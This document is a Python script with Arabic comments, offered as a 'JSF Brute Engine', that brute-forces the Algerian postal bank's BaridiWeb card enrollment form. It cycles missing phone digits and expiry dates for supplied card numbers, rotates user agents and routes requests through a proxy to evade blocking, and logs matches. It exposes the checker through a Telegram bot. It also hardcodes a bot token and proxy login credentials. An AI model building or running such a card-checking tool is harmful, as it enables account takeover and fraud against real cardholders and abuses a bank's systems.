import requests
from bs4 import BeautifulSoup
import urllib3
import time
import concurrent.futures
import threading
import random
try:
    import telebot
    from telebot import types
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False
    print("[!] Warning: pyTelegramBotAPI not installed. Telegram bot disabled.")
    print("[!] Install it with: pip install pyTelegramBotAPI")
import os

# تعطيل تحذيرات SSL لبيئة localhost
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- الإعدادات الأساسية ---
URL = "https://baridiweb.poste.dz/rb/web/pages/enroll.xhtml"
INPUT_FILE = "data.txt"
SUCCESS_FILE = "success.txt"
MAX_VIEWSTATE_RETRIES = 3  # عدد محاولات إعادة الحصول على ViewState

# --- إعدادات بوت تيليجرام ---
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8364224794:AAH2zV6YCp49_93_uU8H5_q_XQpe89UzpUU")  # ضع التوكن هنا أو في متغير البيئة
ENABLE_TELEGRAM_BOT = TELEGRAM_AVAILABLE and bool(TELEGRAM_BOT_TOKEN)  # تفعيل/تعطيل البوت

# --- الإعدادات الأساسية (محسّنة لـ VPS قوي) ---
DELAY_BETWEEN_REQUESTS = 0.05  # تأخير بين الطلبات بالثواني (مخفض للسرعة القصوى)
REQUEST_TIMEOUT = 15  # Timeout للطلبات بالثواني (مخفض لأن الاتصال سريع)
MAX_WORKERS = 20  # عدد الـ Workers (محسّن لـ 5 CPUs + 16GB RAM)
MAX_RETRIES = 2  # عدد محاولات إعادة الاتصال (مخفض للسرعة)
PARALLEL_CARDS = True  # فحص البطاقات بشكل متوازي

# إعدادات البروكسي (يمكن تعيينها من متغيرات البيئة)
# البروكسي الافتراضي: 7e121df0eec2299af81a:771006317fafff4e@go.proxycove.com:824
DEFAULT_PROXY = "http://7e121df0eec2299af81a:771006317fafff4e@go.proxycove.com:824"
PROXY_STRING = os.getenv("PROXY", DEFAULT_PROXY)

# إنشاء PROXY - استخدام البروكسي المحدد أو الافتراضي
PROXY = {
    "http": PROXY_STRING if PROXY_STRING and PROXY_STRING.strip() else DEFAULT_PROXY,
    "https": PROXY_STRING if PROXY_STRING and PROXY_STRING.strip() else DEFAULT_PROXY
}

# قائمة User Agents عشوائية لتجنب الحظر
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
]

# Lock للكتابة الآمنة في الملف
write_lock = threading.Lock()

def get_random_headers():
    """إنشاء هيدرز مع User-Agent عشوائي"""
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://baridiweb.poste.dz",
        "Referer": URL,
        "Connection": "keep-alive"
    }

def get_expiry_dates():
    """توليد قائمة التواريخ من 01/26 إلى 01/28 (جميع الشهور)"""
    dates = []
    # من 01/26 إلى 12/26 (12 شهر)
    dates.extend([f"{str(m).zfill(2)}/26" for m in range(1, 13)])
    # من 01/27 إلى 12/27 (12 شهر)
    dates.extend([f"{str(m).zfill(2)}/27" for m in range(1, 13)])
    # 01/28 فقط
    dates.append("01/28")
    return dates

def safe_write_to_file(filename, content):
    """كتابة آمنة إلى الملف باستخدام Lock"""
    with write_lock:
        try:
            with open(filename, "a", encoding="utf-8") as f:
                f.write(content + "\n")
        except Exception as e:
            print(f"[-] Error writing to {filename}: {e}")

def get_viewstate(soup, session, long_num):
    """استخراج ViewState مع إعادة المحاولة في حالة الفشل"""
    timeout = REQUEST_TIMEOUT
    
    for retry in range(MAX_VIEWSTATE_RETRIES):
        vs_element = soup.find("input", {"name": "javax.faces.ViewState"})
        if vs_element and 'value' in vs_element.attrs:
            return vs_element['value']
        
        if retry < MAX_VIEWSTATE_RETRIES - 1:
            print(f"[-] ViewState not found for {long_num}. Retrying ({retry + 1}/{MAX_VIEWSTATE_RETRIES})...")
            try:
                headers = get_random_headers()
                res = session.get(URL, headers=headers, timeout=timeout)
                res.raise_for_status()
                soup = BeautifulSoup(res.text, 'html.parser')
            except Exception as e:
                print(f"[-] Error refreshing page: {e}")
                time.sleep(1)
    
    return None

def process_single_check(long_num, phone_pattern, callback=None):
    """
    معالجة فحص واحد للبطاقة والهاتف
    callback: دالة يتم استدعاؤها عند إرسال التحديثات (للبوت)
    """
    print(f"[DEBUG] process_single_check called - card: {long_num}, pattern: {phone_pattern}")
    
    # تنظيف الرقم من أي مسافات
    long_num = long_num.replace(" ", "").strip()
    phone_pattern = phone_pattern.strip()
    
    # التحقق من وجود * في نمط الهاتف
    if "*" not in phone_pattern:
        error_msg = f"Phone pattern must contain '*' character: {phone_pattern}"
        print(f"[DEBUG] Validation failed: {error_msg}")
        if callback:
            callback(f"❌ خطأ: {error_msg}")
        return None, error_msg
    
    print(f"[DEBUG] Creating session with proxy")
    session = requests.Session()
    session.verify = False
    if PROXY:
        session.proxies = PROXY
    print(f"[DEBUG] Session created")

    try:
        # 1. الطلب الأول لفتح الجلسة والحصول على أول ViewState
        timeout = REQUEST_TIMEOUT
        delay = DELAY_BETWEEN_REQUESTS
        
        print(f"[DEBUG] Using settings: timeout={timeout}, delay={delay}")
        
        if callback:
            callback(f"🔗 الاتصال بالموقع...\n⏳ قد يستغرق هذا بضع ثوان...")
        
        soup = None
        try:
            print(f"[DEBUG] Attempting to connect to {URL} with timeout {timeout}")
            if PROXY:
                print(f"[DEBUG] Using proxy: {PROXY}")
            else:
                print(f"[DEBUG] No proxy configured")
            start_time = time.time()
            headers = get_random_headers()
            print(f"[DEBUG] Headers created, making GET request...")
            res = session.get(URL, headers=headers, timeout=timeout)
            response_time = time.time() - start_time
            print(f"[DEBUG] Connection successful, response time: {response_time:.2f}s, status: {res.status_code}")
            res.raise_for_status()
            print(f"[DEBUG] Parsing HTML...")
            soup = BeautifulSoup(res.text, 'html.parser')
            print(f"[DEBUG] Page parsed successfully, soup created, length: {len(res.text)}")
            
            if callback:
                callback(f"✅ تم الاتصال بالموقع ({response_time:.2f}s)\n🔄 بدء الفحص...\n📱 Card: {long_num}\n📞 Pattern: {phone_pattern}")
        except requests.exceptions.Timeout as e:
            error_msg = f"⏰ انتهت مهلة الاتصال ({timeout}s). الموقع بطيء جداً أو البروكسي لا يعمل."
            print(f"[ERROR] Timeout: {e}")
            import traceback
            traceback.print_exc()
            if callback:
                callback(error_msg)
            return None, error_msg
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError) as e:
            # إعادة المحاولة مع إنشاء جلسة جديدة
            print(f"[ERROR] Proxy/Connection error, retrying with new session: {e}")
            for retry in range(MAX_RETRIES):
                try:
                    session.close()
                except:
                    pass
                time.sleep(1)
                session = requests.Session()
                session.verify = False
                if PROXY:
                    session.proxies = PROXY
                try:
                    headers = get_random_headers()
                    res = session.get(URL, headers=headers, timeout=timeout)
                    res.raise_for_status()
                    soup = BeautifulSoup(res.text, 'html.parser')
                    if callback:
                        callback(f"✅ تم الاتصال بالموقع\n🔄 بدء الفحص...\n📱 Card: {long_num}")
                    break
                except:
                    if retry == MAX_RETRIES - 1:
                        error_msg = f"❌ فشل الاتصال بعد {MAX_RETRIES} محاولات"
                        if callback:
                            callback(error_msg)
                        return None, error_msg
                    continue
        except requests.exceptions.RequestException as e:
            error_msg = f"❌ خطأ في الطلب: {str(e)}"
            print(f"[ERROR] RequestException: {e}")
            import traceback
            traceback.print_exc()
            if callback:
                callback(error_msg)
            return None, error_msg
        except Exception as e:
            error_msg = f"❌ خطأ غير متوقع: {str(e)}"
            print(f"[ERROR] Unexpected error: {e}")
            import traceback
            traceback.print_exc()
            if callback:
                callback(error_msg)
            return None, error_msg
        
        # التحقق من أن soup تم إنشاؤه بنجاح
        if soup is None:
            error_msg = "❌ فشل في تحميل صفحة الموقع"
            print(f"[ERROR] Soup is None after connection attempt")
            if callback:
                callback(error_msg)
            return None, error_msg
        
        total_attempts = 10 * len(get_expiry_dates())
        print(f"[DEBUG] Starting check loop, total attempts: {total_attempts}")
        
        current_attempt = 0
        last_progress_update = 0
        
        if callback:
            callback(f"⏳ جاري الفحص... 0% (0/{total_attempts})\n⏱️ قد يستغرق هذا بعض الوقت...")
        
        for i in range(10):
            phone_attempt = phone_pattern.replace("*", str(i))
            
            for exp_date in get_expiry_dates():
                current_attempt += 1
                
                # تحديث التقدم للبوت كل 25% فقط (لتقليل spam)
                # ملاحظة: في الوضع المتوازي، التقدم يُحدّث من check_thread
                if callback:
                    progress = (current_attempt / total_attempts) * 100
                    if progress - last_progress_update >= 25:
                        callback(f"⏳ جاري الفحص... {progress:.1f}%\n📞 يرجى الانتظار قليلا حتى الانتهاء")
                        last_progress_update = progress
                
                # استخراج ViewState المحدث
                view_state = get_viewstate(soup, session, long_num)
                if not view_state:
                    error_msg = f"Failed to get ViewState for {long_num}"
                    if callback:
                        callback(f"❌ {error_msg}")
                    return None, error_msg
                
                # 2. بناء البيانات
                payload = {
                    "enrollForm": "enrollForm",
                    "enrollForm:ext_phone": phone_attempt,
                    "enrollForm:ext_cardNumber": long_num,
                    "enrollForm:ext_cardExpiryDate": exp_date,
                    "enrollForm:submit": "",
                    "javax.faces.ViewState": view_state
                }

                # 3. إرسال المحاولة مع retry logic
                timeout = REQUEST_TIMEOUT
                delay = DELAY_BETWEEN_REQUESTS
                request_success = False
                content = None
                
                for retry_attempt in range(MAX_RETRIES):
                    try:
                        headers = get_random_headers()
                        response = session.post(URL, data=payload, headers=headers, timeout=timeout)
                        response.raise_for_status()
                        content = response.text
                        request_success = True
                        break  # نجح الطلب، اخرج من loop
                    except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError) as e:
                        # إعادة إنشاء الجلسة عند فشل البروكسي
                        if retry_attempt < MAX_RETRIES - 1:
                            print(f"[DEBUG] Proxy/Connection error, recreating session (attempt {retry_attempt + 1}/{MAX_RETRIES})")
                            try:
                                session.close()
                            except:
                                pass
                            time.sleep(1)  # انتظر قليلاً قبل إعادة المحاولة
                            session = requests.Session()
                            session.verify = False
                            if PROXY:
                                session.proxies = PROXY
                            # إعادة الحصول على ViewState
                            try:
                                headers = get_random_headers()
                                res = session.get(URL, headers=headers, timeout=timeout)
                                res.raise_for_status()
                                soup = BeautifulSoup(res.text, 'html.parser')
                                view_state = get_viewstate(soup, session, long_num)
                                if view_state:
                                    payload["javax.faces.ViewState"] = view_state
                            except:
                                pass
                            continue
                        else:
                            # فشلت جميع المحاولات
                            print(f"[ERROR] Failed after {MAX_RETRIES} retries: {e}")
                            time.sleep(delay * 2)
                            continue  # استمر للمحاولة التالية
                    except requests.exceptions.Timeout:
                        if retry_attempt < MAX_RETRIES - 1:
                            time.sleep(1)
                            continue
                        else:
                            time.sleep(delay * 2)
                            continue
                    except (requests.exceptions.HTTPError, requests.exceptions.RequestException):
                        time.sleep(delay)
                        continue
                
                if not request_success or content is None:
                    continue  # استمر للمحاولة التالية

                # 4. التحقق من النتيجة
                if "Confirmation code" in content:
                    result = {
                        'success': True,
                        'card': long_num,
                        'phone': phone_attempt,
                        'expiry': exp_date,
                        'message': f"📱 Card: {long_num}\n📞 Phone: {phone_attempt}\n📅 Expiry: {exp_date}"
                    }
                    safe_write_to_file(SUCCESS_FILE, f"MATCH: {long_num}:{phone_attempt}:{exp_date}")
                    return result, None
                
                elif "Incorrect" in content:
                    pass  # استمرار البحث
                
                # تحديث الـ soup
                soup = BeautifulSoup(content, 'html.parser')
                
                # تأخير بين الطلبات
                time.sleep(DELAY_BETWEEN_REQUESTS)

        # لم يتم العثور على تطابق
        result = {
            'success': False,
            'card': long_num,
            'phone_pattern': phone_pattern
        }
        return result, None

    except requests.exceptions.RequestException as e:
        error_msg = f"Network Error: {str(e)}"
        if callback:
            callback(f"❌ {error_msg}")
        return None, error_msg
    except Exception as e:
        error_msg = f"Unexpected Error: {str(e)}"
        if callback:
            callback(f"❌ {error_msg}")
        return None, error_msg
    finally:
        session.close()

def process_line(line):
    """معالجة سطر من الملف (للتوافق مع الكود القديم)"""
    if ":" not in line:
        return
    
    # تقسيم السطر: الرقم الطويل : نمط الهاتف
    parts = line.strip().split(":", 1)
    if len(parts) != 2:
        print(f"[-] Invalid line format: {line.strip()}")
        return
    
    long_num, phone_pattern = parts
    
    # استخدام دالة process_single_check (تم إزالة الكود المكرر)
    result, error = process_single_check(long_num, phone_pattern)
    
    if error:
        print(f"[-] Error processing {long_num}: {error}")
    elif result:
        if result.get('success'):
            # النتيجة تم كتابتها بالفعل في process_single_check
            print(f"[+] Successfully processed {long_num}: Match found!")
        else:
            print(f"[-] No match found for {long_num} with pattern {phone_pattern}")
    else:
        print(f"[-] Unexpected: No result or error returned for {long_num}")

def start():
    print("--- Starting JSF Brute Engine ---")
    
    try:
        with open(INPUT_FILE, "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"[-] Error: {INPUT_FILE} not found!")
        return
    except Exception as e:
        print(f"[-] Error reading {INPUT_FILE}: {e}")
        return
    
    if not lines:
        print(f"[-] Error: {INPUT_FILE} is empty!")
        return
    
    print(f"[+] Loaded {len(lines)} line(s) from {INPUT_FILE}")
    print(f"[+] Starting with {MAX_WORKERS} workers, timeout={REQUEST_TIMEOUT}s, delay={DELAY_BETWEEN_REQUESTS}s")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(process_line, line) for line in lines]
        
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"[-] Error in worker: {e}")
    
    print("\n--- Process completed ---")

def start_telegram_bot():
    """بدء بوت تيليجرام"""
    if not ENABLE_TELEGRAM_BOT:
        print("[!] Telegram bot is disabled. Set TELEGRAM_BOT_TOKEN to enable it.")
        return
    
    if not TELEGRAM_BOT_TOKEN:
        print("[!] Error: TELEGRAM_BOT_TOKEN is not set!")
        print("[!] Set it as environment variable or in the script.")
        return
    
    bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
    
    # قاموس لتخزين الرسائل النشطة (لتحديثها)
    active_messages = {}
    
    def send_update(chat_id, message_id, text):
        """إرسال أو تحديث رسالة"""
        try:
            if chat_id in active_messages and active_messages[chat_id] and message_id:
                # تحديث الرسالة الموجودة
                try:
                    bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=active_messages[chat_id],
                        text=text
                    )
                    return
                except Exception:
                    # إذا فشل التحديث، أرسل رسالة جديدة
                    pass
            
            # إرسال رسالة جديدة
            sent = bot.send_message(chat_id=chat_id, text=text)
            active_messages[chat_id] = sent.message_id
        except Exception as e:
            # محاولة أخيرة لإرسال الرسالة
            try:
                sent = bot.send_message(chat_id=chat_id, text=text)
                active_messages[chat_id] = sent.message_id
            except Exception as err:
                print(f"[-] Error sending message to {chat_id}: {err}")
    
    @bot.message_handler(commands=['start', 'help'])
    def send_welcome(message):
        help_text = """🤖 مرحباً بك في بوت فحص البطاقات

📋 الأوامر المتاحة:
/check - فحص البطاقات
/status - حالة الموقع
/help - عرض هذه المساعدة

📝 طريقة الاستخدام:
أرسل البيانات بالصيغة:
6280703093434667:06999*2406"""
        bot.reply_to(message, help_text)
    
    @bot.message_handler(commands=['status'])
    def send_status(message):
        try:
            # محاولة فحص الموقع بسرعة
            try:
                session = requests.Session()
                session.verify = False
                if PROXY:
                    session.proxies = PROXY
                response = session.get(URL, headers=get_random_headers(), timeout=5)
                session.close()
                is_alive = response.status_code == 200
            except:
                is_alive = False
            
            proxy_status = "✅ مفعل" if PROXY else "❌ غير مفعل"
            
            if is_alive:
                status_text = f"""📊 حالة الموقع:
✅ شغال
🔗 البروكسي: {proxy_status}"""
            else:
                status_text = f"""📊 حالة الموقع:
🛑 الموقع مغلق الان جرب لاحقا
🔗 البروكسي: {proxy_status}"""
            
            bot.reply_to(message, status_text)
        except Exception as e:
            print(f"[ERROR] Error in send_status: {e}")
            try:
                bot.reply_to(message, f"❌ خطأ في فحص الحالة: {str(e)}")
            except:
                pass
    
    @bot.message_handler(commands=['check'])
    def check_command(message):
        bot.reply_to(message, "📝 أرسل البيانات بالصيغة:\n6280703093434667:06999*2406")
    
    @bot.message_handler(func=lambda message: True)
    def handle_message(message):
        text = message.text.strip()
        chat_id = message.chat.id
        
        print(f"[DEBUG] handle_message called - text: '{text}', chat_id: {chat_id}")
        
        # معالجة الأوامر (يتم التعامل معها في handlers أخرى، لكن نتحقق هنا أيضاً)
        if text.startswith('/'):
            print(f"[DEBUG] Message starts with /, ignoring")
            return
        
        # تقسيم النص إلى أسطر (دعم عدة بطاقات)
        lines = [line.strip() for line in text.split('\n') if line.strip()]
        cards_to_check = []
        
        # التحقق من كل سطر
        for line in lines:
            if ":" not in line:
                bot.reply_to(message, "❌ صيغة خاطئة!\n\nاستخدم:\n6280703093434667:06999*2406")
                return
            
            parts = line.split(":", 1)
            if len(parts) != 2:
                bot.reply_to(message, "❌ صيغة خاطئة!\n\nاستخدم:\n6280703093434667:06999*2406")
                return
            
            long_num, phone_pattern = parts[0].strip(), parts[1].strip()
            
            # التحقق من وجود * في نمط الهاتف
            if "*" not in phone_pattern:
                bot.reply_to(message, "❌ نمط الهاتف يجب أن يحتوي على علامة النجمة (*)\n\nمثال: 06999*2406")
                return
            
            cards_to_check.append((long_num, phone_pattern))
        
        if not cards_to_check:
            bot.reply_to(message, "❌ لم يتم العثور على بطاقات للفحص")
            return
        
        print(f"[DEBUG] Found {len(cards_to_check)} card(s) to check")
        
        # بدء الفحص في thread منفصل
        def check_thread():
            try:
                results = []  # لتخزين النتائج الناجحة
                total_cards = len(cards_to_check)
                current_card = 0
                
                def callback(msg):
                    try:
                        send_update(chat_id, active_messages.get(chat_id), msg)
                    except Exception as e:
                        print(f"[-] Callback error: {e}")
                        try:
                            bot.send_message(chat_id=chat_id, text=msg)
                        except:
                            pass
                
                # إرسال رسالة بدء
                callback(f"⏳ جاري الفحص... 0%\n📞 يرجى الانتظار قليلا حتى الانتهاء")
                
                # فحص البطاقات بشكل متوازي (لـ VPS قوي)
                if PARALLEL_CARDS and total_cards > 1:
                    # استخدام ThreadPoolExecutor للمعالجة المتوازية
                    results_lock = threading.Lock()
                    completed = 0
                    last_progress_sent = -25
                    
                    def check_single_card(card_data):
                        nonlocal completed, last_progress_sent
                        long_num, phone_pattern = card_data
                        print(f"[DEBUG] Checking card: {long_num}")
                        
                        try:
                            # callback مخصص لكل بطاقة (بدون تحديثات متوسطة)
                            def card_callback(msg):
                                pass
                            
                            result, error = process_single_check(long_num, phone_pattern, callback=card_callback)
                            
                            with results_lock:
                                completed += 1
                                card_progress = (completed / total_cards) * 100
                                
                                if error:
                                    if "خطأ في البروكسي" not in error and "Connection" not in error:
                                        print(f"[-] Error checking {long_num}: {error}")
                                elif result and result.get('success'):
                                    results.append(result)
                                    print(f"[+] Match found for {long_num}: {result.get('phone')}")
                                
                                # تحديث التقدم كل 25%
                                if card_progress - last_progress_sent >= 25 or completed == total_cards:
                                    callback(f"⏳ جاري الفحص... {card_progress:.1f}%\n📞 يرجى الانتظار قليلا حتى الانتهاء")
                                    last_progress_sent = card_progress
                        except Exception as e:
                            with results_lock:
                                completed += 1
                                print(f"[-] Exception checking {long_num}: {e}")
                    
                    # تشغيل جميع البطاقات بشكل متوازي
                    with concurrent.futures.ThreadPoolExecutor(max_workers=min(MAX_WORKERS, total_cards)) as executor:
                        executor.map(check_single_card, cards_to_check)
                else:
                    # فحص تسلسلي (للبطاقة الواحدة)
                    last_progress_sent = -25
                    for long_num, phone_pattern in cards_to_check:
                        current_card += 1
                        print(f"[DEBUG] Checking card {current_card}/{total_cards}: {long_num}")
                        
                        card_progress = ((current_card - 1) / total_cards) * 100
                        if card_progress - last_progress_sent >= 25:
                            callback(f"⏳ جاري الفحص... {card_progress:.1f}%\n📞 يرجى الانتظار قليلا حتى الانتهاء")
                            last_progress_sent = card_progress
                        
                        max_card_retries = 1  # محاولة واحدة فقط للسرعة
                        for card_retry in range(max_card_retries):
                            try:
                                def card_callback(msg):
                                    pass
                                
                                result, error = process_single_check(long_num, phone_pattern, callback=card_callback)
                                
                                if error:
                                    if "خطأ في البروكسي" in error or "Connection" in error:
                                        if card_retry < max_card_retries - 1:
                                            time.sleep(1)
                                            continue
                                    print(f"[-] Error checking {long_num}: {error}")
                                elif result and result.get('success'):
                                    results.append(result)
                                    print(f"[+] Match found for {long_num}: {result.get('phone')}")
                                break
                            except Exception as e:
                                print(f"[-] Exception checking {long_num}: {e}")
                                if card_retry < max_card_retries - 1:
                                    time.sleep(1)
                                    continue
                        
                        card_progress = (current_card / total_cards) * 100
                        if card_progress - last_progress_sent >= 25 or current_card == total_cards:
                            callback(f"⏳ جاري الفحص... {card_progress:.1f}%\n📞 يرجى الانتظار قليلا حتى الانتهاء")
                            last_progress_sent = card_progress
                
                # إرسال النتائج النهائية
                if results:
                    result_text = "✅ تم العثور على تطابقات:\n\n"
                    for i, result in enumerate(results, 1):
                        result_text += result['message']
                        if i < len(results):
                            result_text += "\n--------------------\n"
                    callback(result_text)
                else:
                    callback("❌ لم يتم العثور على تطابقات")
                    
            except Exception as e:
                print(f"[ERROR] Exception in check_thread: {e}")
                import traceback
                traceback.print_exc()
                try:
                    bot.send_message(chat_id=chat_id, text=f"❌ خطأ في الفحص: {str(e)}")
                except:
                    pass
            finally:
                if chat_id in active_messages:
                    try:
                        del active_messages[chat_id]
                    except:
                        pass
        
        # تشغيل الفحص في thread منفصل
        thread = threading.Thread(target=check_thread, daemon=True)
        thread.start()
        
        # إرسال رسالة تأكيد
        bot.reply_to(message, "✅ تم استلام البيانات، جاري بدء الفحص...")
    
    print("[+] Starting Telegram bot...")
    try:
        bot.infinity_polling(timeout=10, long_polling_timeout=5)
    except Exception as e:
        print(f"[-] Error starting Telegram bot: {e}")

if __name__ == "__main__":
    import sys
    
    # التحقق من وجود argument لتفعيل البوت
    if len(sys.argv) > 1 and sys.argv[1] == "--telegram":
        start_telegram_bot()
    else:
        # تشغيل الوضع العادي (من الملف)
        start()
